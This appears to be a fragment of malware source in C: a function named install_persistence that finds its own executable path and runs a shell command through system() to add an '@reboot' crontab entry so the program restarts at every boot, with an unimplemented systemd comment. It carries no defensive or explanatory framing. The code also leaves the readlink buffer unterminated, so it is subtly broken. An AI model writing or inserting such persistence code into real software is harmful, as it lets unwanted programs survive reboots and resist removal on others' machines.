#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void install_persistence() {
    char path[256];
    readlink("/proc/self/exe", path, sizeof(path));
    // crontab
    char cmd[512];
    sprintf(cmd, "(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", path);
    system(cmd);
    // systemd service (simplified)
}